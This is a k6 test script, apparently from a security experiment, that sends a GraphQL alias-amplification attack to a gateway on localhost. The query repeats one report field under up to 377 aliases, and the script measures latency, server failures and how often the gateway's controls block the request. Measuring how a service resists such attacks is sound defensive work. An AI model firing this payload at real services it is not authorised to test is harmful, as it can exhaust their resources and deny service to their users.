import http from 'k6/http';
import { check, sleep } from 'k6';
import { Trend, Rate } from 'k6/metrics';

// =============================================================================
// UC-04 Ataque por Abuso de Alias
// Variable independiente: numero de alias en UNA sola peticion HTTP
// Escala Fibonacci: 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377 (via ALIAS_COUNT)
// Concurrencia: fija en VUs=1 (variable independiente = alias, no carga)
// Ventana: 60 segundos por escenario
// =============================================================================
export const LatenciaMedia = new Trend('iso_latencia_media');
export const TasaFallosRed = new Rate('iso_tasa_fallos_red');
export const TasaBloqueadas = new Rate('iso_tasa_bloqueadas'); // Bloqueo por control (4xx)

const ALIAS_COUNT = __ENV.ALIAS_COUNT ? parseInt(__ENV.ALIAS_COUNT) : 10;

export const options = {
  vus: __ENV.VUS ? parseInt(__ENV.VUS) : 1,
  duration: '60s',
  userAgent: 'K6-GraphQL-Ofensive-Agent/1.0',
  thresholds: {
    'http_req_failed':   [{ threshold: 'rate<0.99', abortOnFail: false }],
    'http_req_duration': [{ threshold: 'p(95)<60000', abortOnFail: false }],
  },
};

// Construye una unica query con N alias del mismo campo obtenerReporteGeneral
function buildAliasQuery(n) {
  const parts = [];
  for (let i = 1; i <= n; i++) {
    parts.push(`  reporte_${i}: obtenerReporteGeneral { id totalVentas }`);
  }
  return `query AtaqueAmplificacionAlias {\n${parts.join('\n')}\n}`;
}

const GATEWAY_URL = 'http://localhost:4000/graphql';
const QUERY = buildAliasQuery(ALIAS_COUNT);

export default function () {
  const payload = JSON.stringify({ query: QUERY });
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-Attack-Vector': `UC-04-Alias-Count-${ALIAS_COUNT}`,
    },
    timeout: '30s',
  };

  const res = http.post(GATEWAY_URL, payload, params);

  check(res, {
    'Respuesta exitosa (200 sin errores)':      (r) => r.status === 200 && !r.body.includes('errors'),
    'Bloqueado por control (400/403)':          (r) => r.status === 400 || r.status === 403 || (r.status === 200 && r.body.includes('errors')),
    'Servidor caido (500/502/504/timeout)':     (r) => r.status >= 500 || r.error,
  });

  LatenciaMedia.add(res.timings.duration);
  const falloReal = res.status >= 500 || !!res.error;
  TasaFallosRed.add(falloReal);
  const bloqueado4xx = (res.status === 400 || res.status === 403);
  TasaBloqueadas.add(bloqueado4xx);

  sleep(1);
}
